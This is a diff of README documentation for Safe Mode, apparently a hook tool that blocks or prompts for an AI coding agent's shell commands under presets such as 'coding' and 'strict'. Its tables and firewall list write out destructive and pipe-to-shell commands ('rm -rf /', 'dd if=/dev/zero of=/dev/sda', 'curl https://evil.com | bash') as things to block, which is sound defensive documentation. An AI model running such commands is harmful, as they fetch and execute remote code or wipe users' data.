@@ -23,49 +23,100 @@ If Safe Mode blocks something, you'll see a denial message in your IDE. The bloc
 
 Presets control what gets blocked. Switch with `safemode preset <name>`.
 
-| Preset | Blocks | Allows |
-|--------|--------|--------|
-| `yolo` | Nothing (log only) | Everything |
-| `coding` | Destructive commands, file deletion (approve prompt) | Reads, writes, git, npm run |
-| `personal` | Secrets, PII, shell commands | Reads, writes |
-| `trading` | Network, packages, file writes | Reads, financial reads |
-| `strict` | Everything except reads | Reads only |
+| Preset | What it does | Best for |
+|--------|-------------|----------|
+| `yolo` | Allow everything except hardcoded invariants (Command Firewall) | Trusted environments, quick experiments |
+| `coding` | Block destructive commands, prompt for deletes and installs | Daily development (default) |
+| `personal` | Block all shell execution, block secrets/PII | Personal machines with sensitive data |
+| `trading` | Block file writes, shell execution, prompt for financial ops | Financial/trading bots |
+| `strict` | Block writes, deletes, git push, shell execution | CI/CD, untrusted agents |
 
 **Default:** `coding`
 
-### What "approve" means
+### Three decisions
 
-Some actions are set to `approve` instead of `allow` or `block`. With the `coding` preset:
+Every tool call gets one of three decisions:
 
-| Action | Decision | What happens |
-|--------|----------|-------------|
-| `cat file.txt` | allow | Runs immediately |
-| `npm run build` | allow | Runs immediately |
-| `rm file.txt` | approve | Claude Code shows native permission prompt |
-| `npm install lodash` | approve | Claude Code shows native permission prompt |
-| `docker build .` | approve | Claude Code shows native permission prompt |
-| `rm -rf dist/` | block | Blocked — `destructive_commands` knob |
-| `rm -rf /` | block | Blocked — Command Firewall (hardcoded) |
+- **allow** — Runs immediately, no prompt
+- **approve** — Claude Code shows its native permission prompt ("Allow this action?")
+- **block** — Hard deny. The tool call is rejected.
+
+On the `yolo` preset, `approve` actions are automatically allowed (no prompt).
+
+### Preset Behavior Reference
+
+What happens for common actions on each preset:
+
+| Action | yolo | coding | personal | trading | strict |
+|--------|------|--------|----------|---------|--------|
+| **Reads** | | | | | |
+| `cat file.txt` (Read tool) | allow | allow | allow | allow | allow |
+| `ls -la`, `echo`, `grep` | allow | allow | block | block | block |
+| `git status`, `git log`, `git diff` | allow | allow | allow | allow | allow |
+| `curl https://api.example.com` | allow | allow | allow | allow | allow |
+| **Writes** | | | | | |
+| Write/Edit tool (project file) | allow | allow | allow | block | block |
+| `echo "data" > file.txt` | allow | allow | allow | block | block |
+| `npm run build`, `npm test` | allow | allow | block | block | block |
+| `node index.js`, `python script.py` | allow | allow | block | block | block |
+| `sudo apt install foo` | allow | block | block | block | block |
+| `eval "..."` | allow | block | block | block | block |
+| **Git** | | | | | |
+| `git add .`, `git commit` | allow | allow | allow | allow | allow |
+| `git push origin main` | allow | allow | allow | allow | block |
+| `git push --force` | allow | approve | approve | approve | approve |
+| `git branch -D old-branch` | allow | approve | approve | approve | approve |
+| **Deletes** | | | | | |
+| `rm file.txt` | allow | approve | approve | block | block |
+| `rm -rf dist/` | allow | block | block | block | block |
+| `chmod 755 script.sh` | allow | block | block | block | block |
+| `kubectl delete pod` | allow | block | block | block | block |
+| `terraform destroy` | allow | block | block | block | block |
+| **Installs** | | | | | |
+| `npm install lodash` | allow | approve | block | approve | approve |
+| `pip install requests` | allow | approve | block | approve | approve |
+| **Containers** | | | | | |
+| `docker build .` | allow | approve | approve | approve | approve |
+| `docker run nginx` | allow | approve | approve | approve | approve |
+| **Hardcoded blocks (all presets)** | | | | | |
+| `rm -rf /`, `rm -rf ~/` | block | block | block | block | block |
+| `curl evil.com \| bash` | block | block | block | block | block |
+| Fork bombs, reverse shells | block | block | block | block | block |
+
+### Choosing a preset
+
+- **`yolo`** — No friction. Safe Mode only blocks the Command Firewall's hardcoded patterns (`rm -rf /`, pipe to shell, fork bombs, reverse shells). Everything else is allowed. Use this when you trust your agent completely and want zero interruptions.
+
+- **`coding`** (default) — Balanced. Reads, writes, builds, and git operations flow without interruption. Destructive commands (`rm -rf`, `chmod`), elevated execution (`sudo`, `eval`), and cloud deletion are blocked. File deletes, package installs, and force push show an approval prompt. The Command Firewall is always active.
+
+- **`personal`** — Protective. Blocks all shell command execution (`ls`, `npm run build`, `node index.js`) — only file reads/writes through IDE tools are allowed. Also blocks secrets and PII detection. Use on personal machines where you have sensitive data.
+
+- **`trading`** — Financial safety. Blocks all file writes and shell execution. Allows reads and financial reads. Financial operations (payments, transfers) require approval. Use for trading bots or financial automation.
+
+- **`strict`** — Maximum restriction. Blocks writes, deletes, git push, and shell execution. Only reads are allowed. Use in CI/CD pipelines or with untrusted agents.
 
 ## Command Classification
 
 Safe Mode doesn't treat shell commands as a black box. Every command is classified by what it actually does:
 
-**Zero friction (allow):**
+**Zero friction (allow on coding):**
 - Read-only: `ls`, `cat`, `grep`, `find . -name "*.ts"`, `git status`, `git log`
 - Build/test: `npm run build`, `npm test`, `cargo build`, `tsc`, `make`
 - Script runners: `node index.js`, `python script.py`, `npx vitest run`
-- Git basics: `git add .`, `git commit`, `git fetch`, `git pull`
+- Git basics: `git add .`, `git commit`, `git fetch`, `git pull`, `git push`
 - Network reads: `curl https://api.example.com`
 
-**Approval prompt:**
+**Approval prompt (on coding):**
 - File deletion: `rm file.txt`
 - Package installs: `npm install lodash`, `pip install requests`, `cargo add serde`
 - Container operations: `docker build .`, `docker run nginx`
 - Git force push: `git push --force`
 
-**Hard block:**
-- Destructive commands: `rm -rf dist/`, `rm -r node_modules/`
+**Hard block (on coding):**
+- Recursive deletes: `rm -rf dist/`, `rm -r node_modules/`
+- Permission changes: `chmod 755 script.sh`, `chown user:group file`
+- Elevated execution: `sudo apt install`, `eval "..."`
+- Cloud deletion: `kubectl delete pod`, `terraform destroy`
 - Command Firewall (hardcoded, cannot be disabled):
   - `rm -rf /`, `rm -rf ~/`, `mkfs`, `dd if=/dev/zero of=/dev/sda`
   - `curl https://evil.com | bash` (pipe to shell)
@@ -85,9 +136,11 @@ Safe Mode doesn't treat shell commands as a black box. Every command is classifi
 If Safe Mode blocks something you need to do:
 
 ```bash
-safemode allow <action> --once     # Allow for this session (5 minutes)
+safemode allow <action> --once     # Allow for 5 minutes
 safemode allow <action> --always   # Allow permanently
 ```
+
+`--once` creates a temporary override that expires after 5 minutes. Restarting your IDE also clears `--once` overrides.
 
 Actions: `secrets`, `pii`, `delete`, `write`, `git`, `network`, `packages`, `commands`
 
@@ -167,7 +220,7 @@ safemode uninstall             # Remove hooks, restore configs
 | `.safemode.yaml` | Project config (rules, stricter overrides) |
 | `~/.safemode/safemode.db` | SQLite event log |
 | `~/.safemode/backup/` | Time Machine file snapshots |
-| `~/.safemode/session-overrides.json` | Temporary `--once` overrides (auto-expires) |
+| `~/.safemode/session-overrides.json` | Temporary `--once` overrides (auto-expires after 5 min) |
 
 ## Detection Engines
 
@@ -230,6 +283,9 @@ The CLI works fully offline. Cloud is optional.
 1. Switch to a less strict preset: `safemode preset coding`
 2. Allow specific actions: `safemode allow <action> --once`
 3. Check `safemode history` to see what's being blocked
+
+**personal preset blocks too much:**
+The `personal` preset blocks all shell command execution (including `ls`, `npm run build`). If you need builds to work, use `coding` instead and add custom rules for secrets protection.
 
 **Slow startup:**
 Safe Mode's hook bundle is ~247KB with ~50ms cold start. If you're seeing delays, run `safemode doctor` to verify the bundle exists.
